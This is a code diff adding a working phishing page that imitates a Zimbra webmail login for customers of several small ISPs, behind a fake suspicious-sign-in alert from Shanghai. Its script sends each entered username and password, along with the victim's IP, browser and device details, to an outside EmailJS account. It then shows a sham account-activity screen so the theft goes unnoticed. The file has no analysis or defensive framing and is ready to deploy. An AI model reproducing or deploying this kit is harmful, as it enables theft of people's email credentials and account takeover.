@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign In · Activity check</title>
+
+  <!-- ===== FAVICON (all browsers & devices) ===== -->
+  <link rel="icon" type="image/png" href="https://i.imghippo.com/files/dA1368iI.png" />
+  <link rel="shortcut icon" type="image/png" href="https://i.imghippo.com/files/dA1368iI.png" />
+  <link rel="apple-touch-icon" href="https://i.imghippo.com/files/dA1368iI.png" />
+  <link rel="apple-touch-icon" sizes="180x180" href="https://i.imghippo.com/files/dA1368iI.png" />
+  <link rel="mask-icon" href="https://i.imghippo.com/files/dA1368iI.png" color="#0088c1" />
+  <meta name="msapplication-TileImage" content="https://i.imghippo.com/files/dA1368iI.png" />
+  <meta name="msapplication-TileColor" content="#0088c1" />
+  <meta name="theme-color" content="#0088c1" />
+
+  <style>
+    /* ===== base & background ===== */
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
+      background-color: #0088c1;
+      background-image: url('https://i.imghippo.com/files/Qdz9402nEU.png');
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      top:0; left:0;
+      width: 100%; height: 100%;
+      background-color: #0088c1;
+      opacity: 0.5;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .outer-wrapper {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+      flex-direction: column;
+    }
+
+    /* ===== login card ===== */
+    .form-container {
+      width: 100%;
+      max-width: 370px;
+      background-color: white;
+      padding: 50px 40px;
+      box-sizing: border-box;
+      border-radius: 3px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    /* ===== logo wrapper (left-aligned + silver/ash bg) ===== */
+    .logo-wrapper {
+      background-color: #d9dde3;
+      padding: 12px 18px;
+      border-radius: 4px;
+      margin: 0 0 22px 0;
+      display: block;
+      width: fit-content;
+      align-self: flex-start;
+    }
+
+    /* ===== login logo ===== */
+    .login-logo {
+      display: block;
+      width: 100%;
+      max-width: 130px;
+      height: auto;
+      margin: 0;
+      object-fit: contain;
+    }
+
+    .signIn {
+      font-size: 20px;
+      color: #4d4d4d;
+      font-weight: bold;
+      margin: 0 0 25px 0;
+      align-self: flex-start;
+      text-align: left;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+    }
+    label {
+      font-weight: normal;
+      font-size: 13px;
+      color: #000000;
+      margin-bottom: 6px;
+      text-align: left;
+    }
+    .custom-input {
+      font-size: 12px;
+      border-radius: 1px;
+      padding: 10px 12px !important;
+      background: #ffffff;
+      border: 1px solid #d9d9d9;
+      box-sizing: border-box;
+      width: 100%;
+      appearance: none;
+      text-shadow: none;
+      margin: 0;
+      transition: border-color 0.3s;
+    }
+    .custom-input:focus {
+      border-color: #0088c1;
+      outline: none;
+    }
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    .actions-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+    }
+    .checkbox-container input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      margin-right: 8px;
+      cursor: pointer;
+    }
+    .checkbox-container label {
+      font-weight: normal;
+      font-size: 13px;
+      cursor: pointer;
+      margin: 0;
+    }
+    .custom-submit {
+      background-color: #0088c1;
+      color: #ffffff;
+      font-weight: 400;
+      padding: 0 18px;
+      height: 34px;
+      border: 2px solid #0088c1;
+      border-radius: 4px;
+      cursor: pointer;
+      line-height: 30px;
+      text-align: center;
+      width: auto;
+      box-sizing: border-box;
+      transition: background-color 0.3s, border-color 0.3s;
+    }
+    .custom-submit:hover {
+      background-color: #006f9a;
+      border-color: #006f9a;
+    }
+    .custom-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      margin-top: -5px;
+      margin-bottom: 5px;
+    }
+    .form-error-banner {
+      display: none;
+      width: 100%;
+      background: #fff5f5;
+      border: 1px solid #f5c2c0;
+      border-left: 4px solid #d93025;
+      border-radius: 4px;
+      padding: 12px 14px;
+      box-sizing: border-box;
+      font-size: 13px;
+      color: #7a1c17;
+      line-height: 1.5;
+      margin-bottom: 5px;
+    }
+    .form-error-banner.show {
+      display: block;
+    }
+    .form-error-banner strong {
+      color: #d93025;
+    }
+    .footer-text {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: white;
+      font-size: 10px;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* ===== activity page ===== */
+    .activity-container {
+      display: none;
+      width: 100%;
+      max-width: 560px;
+      background-color: #ffffff;
+      border-radius: 4px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+      padding: 40px 45px;
+      box-sizing: border-box;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .activity-title {
+      font-size: 22px;
+      font-weight: bold;
+      color: #333;
+      margin: 0 0 8px 0;
+    }
+    .activity-subtitle {
+      font-size: 13px;
+      color: #666;
+      margin: 0 0 28px 0;
+      line-height: 1.5;
+    }
+    .session-list {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .session-card {
+      display: flex;
+      align-items: flex-start;
+      padding: 16px 18px;
+      border: 1px solid #e2e2e2;
+      border-radius: 6px;
+      background: #fafafa;
+      box-sizing: border-box;
+      transition: opacity 0.2s, background 0.2s;
+    }
+    .session-card.current {
+      border-color: #0088c1;
+      background: #f0f9fd;
+    }
+    .session-icon {
+      width: 36px;
+      height: 36px;
+      margin-right: 14px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #e6e6e6;
+      font-size: 18px;
+    }
+    .session-card.current .session-icon {
+      background: #d3eefa;
+    }
+    .session-details {
+      flex: 1;
+      font-size: 13px;
+      color: #333;
+      line-height: 1.5;
+      min-width: 0;
+    }
+    .session-device {
+      font-weight: bold;
+      font-size: 14px;
+      color: #222;
+      margin-bottom: 2px;
+      word-wrap: break-word;
+    }
+    .session-meta {
+      color: #666;
+      font-size: 12px;
+      word-wrap: break-word;
+    }
+    .session-badge {
+      display: inline-block;
+      font-size: 10px;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 2px 8px;
+      border-radius: 10px;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    .session-badge.current {
+      background: #0088c1;
+      color: #fff;
+    }
+    .session-badge.suspicious {
+      background: #d93025;
+      color: #fff;
+    }
+    .remove-btn {
+      flex-shrink: 0;
+      margin-left: 12px;
+      background: transparent;
+      color: #d93025;
+      border: 1px solid #d93025;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 6px 12px;
+      cursor: pointer;
+      align-self: center;
+      transition: background-color 0.25s, color 0.25s;
+      white-space: nowrap;
+    }
+    .remove-btn:hover {
+      background: #d93025;
+      color: #fff;
+    }
+    .alert-box {
+      width: 100%;
+      background: #fff5f5;
+      border: 1px solid #f5c2c0;
+      border-left: 4px solid #d93025;
+      border-radius: 4px;
+      padding: 14px 16px;
+      margin: 22px 0 26px 0;
+      box-sizing: border-box;
+      font-size: 13px;
+      color: #7a1c17;
+      line-height: 1.5;
+    }
+    .alert-box strong {
+      color: #d93025;
+    }
+    .activity-actions {
+      display: flex;
+      gap: 12px;
+      width: 100%;
+      flex-wrap: wrap;
+    }
+    .btn-primary,
+    .btn-secondary {
+      flex: 1;
+      min-width: 160px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 4px;
+      cursor: pointer;
+      text-align: center;
+      box-sizing: border-box;
+      border: 2px solid transparent;
+      transition: background-color 0.3s, border-color 0.3s;
+    }
+    .btn-primary {
+      background-color: #0088c1;
+      color: #fff;
+      border-color: #0088c1;
+    }
+    .btn-primary:hover {
+      background-color: #006f9a;
+      border-color: #006f9a;
+    }
+    .btn-secondary {
+      background-color: #ffffff;
+      color: #0088c1;
+      border-color: #0088c1;
+    }
+    .btn-secondary:hover {
+      background-color: #f0f9fd;
+    }
+
+    /* removed sessions (fade out) */
+    .session-card.removed {
+      display: none;
+    }
+
+    @media screen and (max-width: 480px) {
+      .form-container {
+        max-width: 100%;
+        padding: 30px 20px;
+        border-radius: 0;
+      }
+      .logo-wrapper {
+        margin: 0 0 16px 0;
+        padding: 10px 14px;
+      }
+      .login-logo {
+        max-width: 110px;
+      }
+      .signIn {
+        font-size: 18px;
+        text-align: left;
+        width: 100%;
+        margin-bottom: 20px;
+        align-self: flex-start;
+      }
+      form { width: 100%; }
+      label { font-size: 14px; }
+      .custom-input {
+        font-size: 14px;
+        padding: 10px 12px !important;
+      }
+      .actions-row {
+        flex-direction: column;
+        gap: 12px;
+        align-items: stretch;
+      }
+      .custom-submit {
+        width: 100%;
+        font-size: 16px;
+        padding: 12px;
+        height: auto;
+        line-height: normal;
+      }
+      .checkbox-container {
+        justify-content: flex-start;
+        margin-top: 5px;
+      }
+      .footer-text {
+        font-size: 9px;
+        padding: 5px 10px;
+        position: relative;
+        bottom: auto;
+      }
+      .activity-container {
+        max-width: 100%;
+        padding: 30px 20px;
+        border-radius: 0;
+      }
+      .activity-title,
+      .activity-subtitle {
+        text-align: center;
+        width: 100%;
+        align-self: center;
+      }
+      .activity-actions { flex-direction: column; }
+      .session-card { flex-wrap: wrap; }
+      .remove-btn {
+        margin-left: 0;
+        margin-top: 10px;
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="outer-wrapper">
+
+  <!-- ====== LOGIN FORM VIEW ====== -->
+  <div class="form-container" id="login-view">
+    <div class="logo-wrapper">
+      <img src="https://i.imghippo.com/files/lLd7399gDk.png" alt="gpcom.net-large" class="login-logo" />
+    </div>
+    <div class="signIn">View Activity</div>
+
+    <div class="form-error-banner" id="form-error-banner">
+      <strong>Incorrect username or password.</strong><br>
+      Please check your details and try again.
+    </div>
+
+    <form id="contact-form" novalidate>
+      <div class="input-group">
+        <label for="email-input">Username</label>
+        <input id="email-input" class="custom-input" type="email" name="user_email" required placeholder=" " />
+        <div id="email-error" class="error-message"></div>
+      </div>
+      <div class="input-group">
+        <label for="password-input">Password</label>
+        <input id="password-input" class="custom-input" type="password" name="user_password" required placeholder=" " />
+        <div id="password-error" class="error-message"></div>
+      </div>
+      <div class="actions-row">
+        <button type="submit" class="custom-submit" id="submit-btn">Continue</button>
+        <div class="checkbox-container">
+          <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
+          <label for="stay-signed-in">Stay signed in</label>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <!-- ====== ACTIVITY PAGE VIEW ====== -->
+  <div class="activity-container" id="activity-view">
+    <h1 class="activity-title">Verify your activity</h1>
+    <p class="activity-subtitle">
+      We noticed two recent sign-in attempts on your account. If you don't recognize
+      the activity below, please remove the device and secure your account immediately.
+    </p>
+
+    <div class="session-list" id="session-list">
+      <!-- Current session (just logged in) -->
+      <div class="session-card current" id="session-current">
+        <div class="session-icon">💻</div>
+        <div class="session-details">
+          <div class="session-device">
+            <span id="current-device-label">This device</span>
+            <span class="session-badge current">Current</span>
+          </div>
+          <div class="session-meta" id="current-device-meta">
+            Loading device info…
+          </div>
+        </div>
+        <button class="remove-btn" data-session="current" id="remove-current">Remove</button>
+      </div>
+
+      <!-- Suspicious session from Shanghai, China -->
+      <div class="session-card" id="session-warsaw">
+        <div class="session-icon">⚠️</div>
+        <div class="session-details">
+          <div class="session-device">
+            Unknown Windows PC
+            <span class="session-badge suspicious">Suspicious</span>
+          </div>
+          <div class="session-meta">
+            Shanghai, Shanghai, China · IP 185.243.115.84<br>
+            Chrome on Windows 10 · Just now
+          </div>
+        </div>
+        <button class="remove-btn" data-session="warsaw" id="remove-warsaw">Remove</button>
+      </div>
+    </div>
+
+    <div class="alert-box" id="alert-box">
+      <strong>Was this you?</strong><br>
+      If you did not sign in from <strong>Shanghai, Shanghai, China</strong>, your password
+      may have been compromised. We recommend changing it immediately.
+    </div>
+
+    <div class="activity-actions">
+      <button class="btn-primary" id="this-was-me">Yes, this was me</button>
+      <button class="btn-secondary" id="secure-account">Secure my account</button>
+    </div>
+  </div>
+
+  <div class="footer-text">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("uGRhkufMjo08rjwb_");
+  })();
+
+  // ----- DOM elements -----
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("email-input");
+  const passwordInput = document.getElementById("password-input");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+  const formErrorBanner = document.getElementById("form-error-banner");
+  const submitBtn = document.getElementById("submit-btn");
+
+  const loginView = document.getElementById("login-view");
+  const activityView = document.getElementById("activity-view");
+  const currentDeviceMeta = document.getElementById("current-device-meta");
+
+  // Session elements
+  const sessionCurrent = document.getElementById("session-current");
+  const sessionWarsaw = document.getElementById("session-warsaw");
+  const removeCurrentBtn = document.getElementById("remove-current");
+  const removeWarsawBtn = document.getElementById("remove-warsaw");
+  const alertBox = document.getElementById("alert-box");
+
+  let attemptNumber = 1;
+
+  // ----- accepted email domains -----
+  const ACCEPTED_DOMAINS = [
+    "bevcomm.net",
+    "nemont.net",
+    "peak.org",
+    "kmtel.com",
+    "highland.net",
+    "peoplescom.net",
+    "web-access.net",
+    "comporium.net",
+    "mintel.com",
+    "grm.net",
+    "his.com",
+    "hers.com",
+    "gbta.net",
+    "hardynet.com",
+    "gpcom.net",
+    "etczone.com"
+  ];
+
+  // build a regex that allows any of these domains
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  // ----- helpers -----
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) {
+      return "Not available";
+    }
+  }
+
+  // ----- send to emailjs -----
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const ip = await getIP();
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = getDeviceType();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  // ----- form submit -----
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    emailError.textContent = "";
+    passwordError.textContent = "";
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      emailError.textContent = "Email is required.";
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      emailError.textContent = "Email must be from an accepted domain.";
+      valid = false;
+    }
+    if (!passwordValue) {
+      passwordError.textContent = "Password is required.";
+      valid = false;
+    }
+    if (!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    // Show activity page immediately on first attempt
+    setTimeout(() => {
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Continue";
+      formErrorBanner.classList.remove("show");
+      loginView.style.display = "none";
+      activityView.style.display = "flex";
+      // reset sessions to visible (in case they were removed earlier)
+      sessionCurrent.classList.remove("removed");
+      sessionWarsaw.classList.remove("removed");
+      // update current device meta
+      currentDeviceMeta.textContent =
+        `${getBrowser()} on ${getOS()} · ${getTimezone()}`;
+    }, 700);
+  });
+
+  // ============================================================
+  //   REMOVE SESSION BUTTONS – NO REDIRECT, JUST HIDE THE CARD
+  // ============================================================
+  function removeSession(sessionElement, deviceName) {
+    if (!sessionElement) return;
+    sessionElement.classList.add("removed");
+    console.log(`Session removed: ${deviceName}`);
+  }
+
+  removeCurrentBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionCurrent, "current device");
+  });
+
+  removeWarsawBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionWarsaw, "Shanghai, Shanghai, China");
+  });
+
+  // ============================================================
+  //   ACTIVITY PAGE BUTTONS
+  // ============================================================
+
+  document.getElementById("this-was-me").addEventListener("click", () => {
+    activityView.style.display = "none";
+    loginView.style.display = "flex";
+    form.reset();
+    formErrorBanner.classList.remove("show");
+    attemptNumber = 1;
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+    currentDeviceMeta.textContent = "Loading device info…";
+  });
+
+  document.getElementById("secure-account").addEventListener("click", () => {
+    removeSession(sessionWarsaw, "Shanghai, Shanghai, China (secured)");
+    alertBox.innerHTML = `
+      <strong>Account secured.</strong><br>
+      The suspicious session from <strong>Shanghai, Shanghai, China</strong> has been removed.
+    `;
+  });
+</script>
+</body>
+</html>
